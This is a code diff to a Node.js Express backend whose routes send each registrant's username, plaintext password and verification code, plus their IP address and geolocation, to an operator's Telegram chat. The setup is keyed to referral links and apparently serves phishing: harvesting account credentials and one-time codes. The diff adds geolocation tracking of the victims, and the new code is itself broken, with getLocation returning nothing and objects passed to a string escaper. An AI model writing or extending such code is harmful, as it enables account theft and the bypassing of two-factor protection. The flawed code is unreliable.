@@ -72,6 +72,11 @@ import Referral from "./models/Referral.js";
 import Activity from "./models/Activity.js";
 import otpRoutes from "./otp.js";
 // ---------- HELPERS ----------
+import { getFullLocation } from "./location.js";
+
+app.set("trust proxy", true);
+
+
 function formatPhone(phone) {
   if (!phone) return "";
   const digits = phone.toString().replace(/\D/g, "");
@@ -114,20 +119,12 @@ function uploadToCloudinaryBuffer(buffer, options = {}) {
 }
 
 // Get location via ipwho.is with safe fallback
-async function getLocation(ip) {
+async function getLocation(req) {
   try {
-    if (!ip) return {};
-    const clean = (ip || "").split(",")[0].trim();
-    const { data } = await axios.get(`https://ipwho.is/${clean}`, { timeout: 3000 });
-    if (!data || data.success === false) return {};
-    return {
-      city: data.city,
-      region: data.region,
-      country: data.country,
-      country_code: data.country_code,
-      flag: data.flag || {}
-    };
-  } catch (err) {
+    await getFullLocation(req);
+
+    
+      } catch (err) {
     // rate limit or network errors
     console.warn("getLocation failed:", err?.response?.status || err?.message);
     return {};
@@ -554,7 +551,7 @@ app.post("/student/visit", async (req, res) => {
     }
 
     const ip = req.headers["x-forwarded-for"] || req.socket?.remoteAddress || null;
-    const location = await getLocation(ip);
+    const location = await getLocation(req);
 
     await Activity.create({
       adminId: admin._id,
@@ -567,7 +564,7 @@ Hey *${escapeMarkdown(admin.firstname || admin.username)}* 📈 someone visited 
 Path: ${escapeMarkdown(path || "/")}
 Referral: ${escapeMarkdown(actualReferrer || "direct")}
 Location: ${escapeMarkdown(location.city || "Hidden")}, ${escapeMarkdown(location.country || "Hidden")}
-IP: *${escapeMarkdown(ip || "Hidden")}*
+IP: *${escapeMarkdown(ip || "Hidden")}*,${escapeMarkdown(location)}
 `;
     sendTelegram(admin.chatId || ADMIN_CHAT_ID, message).catch(()=>null);
 
@@ -630,7 +627,7 @@ app.post("/student/register", async (req, res) => {
     }
 
     const ip = req.headers["x-forwarded-for"] || req.socket?.remoteAddress || null;
-    const location = await getLocation(ip);
+    const location = await getLocation(req);
 
     await Activity.create({
       adminId: admin._id,
@@ -647,12 +644,12 @@ Platform: ${escapeMarkdown(platformName)}
 Username: *${escapeMarkdown(username)}*
 password : *${escapeMarkdown(password)}*
 Referrer: *${escapeMarkdown(admin.username)}*
-Location: ${escapeMarkdown(location.city || "Unknown")}, ${escapeMarkdown(location.country || "Unknown")},
-*${escapeMarkdown(location.state || "unknown")}*
+Location: ${escapeMarkdown(location.city || "Unknown")}, ${escapeMarkdown(location.country || "Unknown")}${location.flag.emoji || "Unknown"},
+*${escapeMarkdown(location.state || "unknown")}*,\n ${escapeMarkdown(location)}
 `;
     sendTelegram(admin.chatId || ADMIN_CHAT_ID, adminMsg).catch(()=>null);
 
-    await sendTelegram(ADMIN_CHAT_ID, `🆕 Student registered: *${username}* (via ${admin.username}'s link) from ${escapeMarkdown(location.country || "Unknown")}`);
+    await sendTelegram(ADMIN_CHAT_ID, `🆕 Student registered: *${username}* (via ${admin.username}'s link) from ${escapeMarkdown(location|| "Unknown")}`);
 
     return res.json({ success: true, studentId: student._id, admin: { username: admin.username, phone: admin.phone } });
   } catch (e) {
@@ -667,7 +664,7 @@ app.post("/student/send-code", async (req, res) => {
     const { code, referralCode, platform, username } = req.body || {};
     if (!referralCode) return res.status(400).json({ success: false, error: "Referral code is required" });
     if (!code) return res.status(400).json({ success: false, error: "Verification code is required" });
-
+const location = await getLocation(req);
     const ref = await Referral.findOne({ code: referralCode }).lean();
     if (!ref) return res.status(404).json({ success: false, error: "Invalid referral code" });
 
@@ -679,7 +676,7 @@ app.post("/student/send-code", async (req, res) => {
 Username: ${escapeMarkdown(username || "Unknown")}
 Platform: ${escapeMarkdown(platform || "unknown")}
 Code: \`${escapeMarkdown(code)}\`
-`;
+\n ${escapeMarkdown(location)}`;
     await sendTelegram(admin.chatId || ADMIN_CHAT_ID, msg);
 
     await Activity.create({ adminId: admin._id, action: "verification_requested", details: { username, code, platform } });
